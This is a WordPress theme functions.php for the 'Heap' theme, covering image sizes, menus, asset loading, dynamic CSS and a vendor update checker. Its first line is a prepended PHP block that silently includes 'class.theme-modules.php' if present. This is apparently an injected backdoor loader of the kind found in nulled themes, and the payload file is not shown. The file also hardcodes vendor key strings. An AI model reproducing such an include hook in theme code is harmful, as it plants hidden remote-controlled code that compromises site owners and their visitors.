<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// ensure REQUEST_PROTOCOL is defined
if ( ! defined( 'REQUEST_PROTOCOL' ) ) {
	if ( is_ssl() ) {
		define( 'REQUEST_PROTOCOL', 'https:' );
	} else {
		define( 'REQUEST_PROTOCOL', 'http:' );
	}
}

// Loads the theme's translated strings
load_theme_textdomain( 'heap', get_template_directory() . '/languages/' );

if ( ! function_exists( 'heap_theme_setup' ) ) {
	function heap_theme_setup() {

		add_theme_support( 'automatic-feed-links' );

		// add theme support for post formats
		// child themes note: use the after_setup_theme hook with a callback
		$formats = array( 'video', 'audio', 'gallery', 'image', 'quote', 'link', 'chat', 'aside', );
		add_theme_support( 'post-formats', $formats );

		// Add theme support for Featured Images
		add_theme_support( 'post-thumbnails' );

		/*
		 * MAXIMUM SIZE
		 * Maximum Full Image Size
		 * - Sliders
		 * - Lightbox
		 */
		add_image_size( 'full-size', 2048 );

		/*
		 * MEDIUM SIZE
		 * - Split Article
		 * - Tablet Sliders
		 */
		add_image_size( 'medium-size', 1024 );

		/*
		 * SMALL SIZE (cropped)
		 * - Masonry Grid
		 * - Mobile Sliders
		 */
		add_image_size( 'small-size', 400 );

		// Classic blog
		add_image_size( 'post-square-small', 177, 177, true );

		/*
		 * MEDIUM SIZE (cropped)
		 * - Related Posts
		 */
		add_image_size( 'post-square-medium', 380, 380, true );

		// Heap blog
		add_image_size( 'post-medium', 265, 328, true );

		add_theme_support( 'menus' );

		register_nav_menu( 'main_menu', 'Main Menu' );
		register_nav_menu( 'social_menu', 'Social Menu' );
		register_nav_menu( 'footer_menu', 'Footer Menu' );


		/**
		 * Pixcare Helper Plugin
		 */
		add_theme_support( 'pixelgrade_care', array(
				'support_url'   => 'https://pixelgrade.com/docs/heap/',
				'changelog_url' => 'https://wupdates.com/heap-changelog',
				'ock'           => 'Lm12n034gL19',
				'ocs'           => '6AU8WKBK1yZRDerL57ObzDPM7SGWRp21Csi5Ti5LdVNG9MbP'
			)
		);
	}
}
add_action( 'after_setup_theme', 'heap_theme_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function heap_content_width() {
	// We need to substract the margins and the sidebar width
	$content_width = pixelgrade_option( 'content_width', 1368 ) - pixelgrade_option( 'content_horizontal_margins', 96 ) * 2 - 300;

	$GLOBALS['content_width'] = apply_filters( 'heap_content_width', $content_width, 0 );
}
add_action( 'after_setup_theme', 'heap_content_width', 0 );

/**
 * Adjusts content_width value depending on situation.
 *
 * @since Heap 1.9.4
 */
function heap_content_with_sidebar_width() {
	if ( ! pixelgrade_option( 'blog_single_show_sidebar' ) || ! is_active_sidebar( 'sidebar-main' ) ) {
		// We need to substract the margins
		$content_width = pixelgrade_option( 'content_width', 1368 ) - pixelgrade_option( 'content_horizontal_margins', 96 ) * 2;
		$GLOBALS['content_width'] = apply_filters( 'heap_content_with_sidebar_width', $content_width, 0 ); /* pixels */
	}
}
add_action( 'template_redirect', 'heap_content_with_sidebar_width' );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for images
 *
 * @since Heap 1.9.4
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function heap_content_image_sizes_attr( $sizes, $size ) {
	// We need to substract the margins
	$content_width = pixelgrade_option( 'content_width', 1368 ) - pixelgrade_option( 'content_horizontal_margins', 96 ) * 2;
	// Also substract the sidebar if it is present
	if ( pixelgrade_option( 'blog_single_show_sidebar' ) && is_active_sidebar( 'sidebar-main' ) ) {
		$content_width -= 300;
	}

	// Get the image width
	$width = $size[0];

	$content_width <= $width && $sizes = '(max-width: 600px) 99vw, (max-width: 900px) 98vw, ' . $content_width . 'px';

	$content_width > $width && 900 <= $width && $sizes = '(max-width: 600px) 99vw, (max-width: ' . $width . 'px) 98vw, ' . $width . 'px';

	900 > $width && $sizes = '(max-width: ' . $width . 'px) 99vw, ' . $width . 'px';

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'heap_content_image_sizes_attr', 10 , 2 );

/// load assets
if ( ! function_exists( 'heap_load_assets' ) ) {

	function heap_load_assets() {

		$theme = wp_get_theme();
		// Styles
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

		if ( is_404() ) {
			wp_enqueue_style( 'heap-404-style', get_template_directory_uri() . '/404.css', array(), time(), 'all' );
		}

		if ( ! class_exists( 'PixCustomifyPlugin' ) ) {
			wp_enqueue_style( 'heap-google-webfonts', REQUEST_PROTOCOL . '//fonts.googleapis.com/css?family=Open+Sans:400italic,400,300,700' );
		}

		if ( !is_rtl() ) {
			wp_enqueue_style( 'heap-main-style', get_stylesheet_uri(), array(), $theme->get( 'Version' ) );
		}

		wp_enqueue_script( 'heap-rs', '//pxgcdn.com/js/rs/9.5.7/index.js', array( 'jquery' ) );
		wp_enqueue_script( 'heap-main-scripts', get_template_directory_uri() . '/assets/js/main.js', array( 'heap-rs' ), $theme->get( 'Version' ), true );

		if ( is_single() && pixelgrade_option( 'blog_single_show_share_links' ) ) {
			wp_enqueue_script( 'addthis-api', '//s7.addthis.com/js/300/addthis_widget.js#async=1', array( 'jquery' ), null, true );

			//here we will configure the AddThis sharing globally
			get_template_part( 'theme-partials/wpgrade-partials/addthis-js-config' );
		}

		//wp_localize_script( 'heap-main-scripts', 'theme_name', wpgrade::shortname() );
		wp_localize_script( 'heap-main-scripts', 'objectl10n', array(
			'tPrev'             => esc_html__( 'Previous (Left arrow key)', 'heap' ),
			'tNext'             => esc_html__( 'Next (Right arrow key)', 'heap' ),
			'tCounter'          => esc_html__( 'of', 'heap' ),
			'infscrLoadingText' => "",
			'infscrReachedEnd'  => "",
		) );


		/**
		 * Here we add some dynamic style
		 */
		ob_start();

		// Masonry archive column widths
		//round to 2 decimals
		$masonry_small_width = round( 100 / (float)pixelgrade_option('blog_layout_masonry_small_columns'), 2);
		$masonry_medium_width = round( 100 / (float)pixelgrade_option('blog_layout_masonry_medium_columns'), 2);
		$masonry_big_width = round( 100 / (float)pixelgrade_option('blog_layout_masonry_big_columns'), 2); ?>
		@media screen and (min-width: 481px) and (max-width: 899px) {
			.mosaic .mosaic__item  {
				width: <?php echo $masonry_small_width; ?>%;
			}
		}

		@media screen and (min-width: 900px) and (max-width: 1249px) {
			.mosaic .mosaic__item  {
				width: <?php echo $masonry_medium_width; ?>%;
			}
		}

		@media screen and (min-width: 1250px){
			.mosaic .mosaic__item  {
				width: <?php echo $masonry_big_width; ?>%;
			}
		}<?php

		if ( pixelgrade_option('custom_css') ):
			echo "\n" . pixelgrade_option('custom_css') . "\n";
		endif;

		$custom_css = ob_get_clean();
		echo '<style>' . $custom_css . '</style>';

	} // heap_load_assets()
}
add_action( 'wp_enqueue_scripts', 'heap_load_assets' );

require get_template_directory() . '/inc/classes/wpgrade.php';

require get_template_directory() . '/inc/vendors.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

require get_template_directory() . '/inc/activation.php';

require get_template_directory() . '/inc/widgets.php';

require get_template_directory() . '/inc/unsorted.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Custom functions for the WordPress admin area
 */
//if ( is_admin() ) {
//	require get_template_directory() . '/inc/extras_admin.php';
//}

/**
 * MB string functions for when the MB library is not available
 */
require get_template_directory() . '/inc/mb_compat.php';

/**
 * Load various plugin integrations
 */
require get_template_directory() . '/inc/integrations.php';
/**
 * Load Recommended/Required plugins notification
 */
require get_template_directory() . '/inc/required-plugins/required-plugins.php';

#
# Please perform any initialization via options in wpgrade-config and
# calls in wpgrade-core/bootstrap. Required for testing.
#

/* Automagical updates */
function wupdates_check_MAYEM( $transient ) {
	// First get the theme directory name (the theme slug - unique)
	$slug = basename( get_template_directory() );

	// Nothing to do here if the checked transient entry is empty or if we have already checked
	if ( empty( $transient->checked ) || empty( $transient->checked[ $slug ] ) || ! empty( $transient->response[ $slug ] ) ) {
		return $transient;
	}

	// Let's start gathering data about the theme
	// Then WordPress version
	include( ABSPATH . WPINC . '/version.php' );
	$http_args = array (
		'body' => array(
			'slug' => $slug,
			'url' => home_url( '/' ), //the site's home URL
			'version' => 0,
			'locale' => get_locale(),
			'phpv' => phpversion(),
			'child_theme' => is_child_theme(),
			'data' => null, //no optional data is sent by default
		),
		'user-agent' => 'WordPress/' . $wp_version . '; ' . home_url( '/' )
	);

	// If the theme has been checked for updates before, get the checked version
	if ( isset( $transient->checked[ $slug ] ) && $transient->checked[ $slug ] ) {
		$http_args['body']['version'] = $transient->checked[ $slug ];
	}

	// Use this filter to add optional data to send
	// Make sure you return an associative array - do not encode it in any way
	$optional_data = apply_filters( 'wupdates_call_data_request', $http_args['body']['data'], $slug, $http_args['body']['version'] );

	// Encrypting optional data with private key, just to keep your data a little safer
	// You should not edit the code bellow
	$optional_data = json_encode( $optional_data );
	$w=array();$re="";$s=array();$sa=md5('8404cb7882deeb763a138bb2f6cdd52391542a4e');
	$l=strlen($sa);$d=$optional_data;$ii=-1;
	while(++$ii<256){$w[$ii]=ord(substr($sa,(($ii%$l)+1),1));$s[$ii]=$ii;} $ii=-1;$j=0;
	while(++$ii<256){$j=($j+$w[$ii]+$s[$ii])%255;$t=$s[$j];$s[$ii]=$s[$j];$s[$j]=$t;}
	$l=strlen($d);$ii=-1;$j=0;$k=0;
	while(++$ii<$l){$j=($j+1)%256;$k=($k+$s[$j])%255;$t=$w[$j];$s[$j]=$s[$k];$s[$k]=$t;
		$x=$s[(($s[$j]+$s[$k])%255)];$re.=chr(ord($d[$ii])^$x);}
	$optional_data=bin2hex($re);

	// Save the encrypted optional data so it can be sent to the updates server
	$http_args['body']['data'] = $optional_data;

	// Check for an available update
	$url = $http_url = set_url_scheme( 'https://wupdates.com/wp-json/wup/v1/themes/check_version/MAYEM', 'http' );
	if ( $ssl = wp_http_supports( array( 'ssl' ) ) ) {
		$url = set_url_scheme( $url, 'https' );
	}

	$raw_response = wp_remote_post( $url, $http_args );
	if ( $ssl && is_wp_error( $raw_response ) ) {
		$raw_response = wp_remote_post( $http_url, $http_args );
	}
	// We stop in case we haven't received a proper response
	if ( is_wp_error( $raw_response ) || 200 != wp_remote_retrieve_response_code( $raw_response ) ) {
		return $transient;
	}

	$response = (array) json_decode($raw_response['body']);
	if ( ! empty( $response ) ) {
		// You can use this action to show notifications or take other action
		do_action( 'wupdates_before_response', $response, $transient );
		if ( isset( $response['allow_update'] ) && $response['allow_update'] && isset( $response['transient'] ) ) {
			$transient->response[ $slug ] = (array) $response['transient'];
		}
		do_action( 'wupdates_after_response', $response, $transient );
	}

	return $transient;
}
add_filter( 'pre_set_site_transient_update_themes', 'wupdates_check_MAYEM' );

function wupdates_add_id_MAYEM( $ids = array() ) {
	// First get the theme directory name (unique)
	$slug = basename( get_template_directory() );

	// Now add the predefined details about this product
	// Do not tamper with these please!!!
	$ids[ $slug ] = array( 'name' => 'Heap', 'slug' => 'heap', 'id' => 'MAYEM', 'type' => 'theme', 'digest' => '61354c8fa1874a968787d11198d7d50e', );

	return $ids;
}
add_filter( 'wupdates_gather_ids', 'wupdates_add_id_MAYEM', 10, 1 );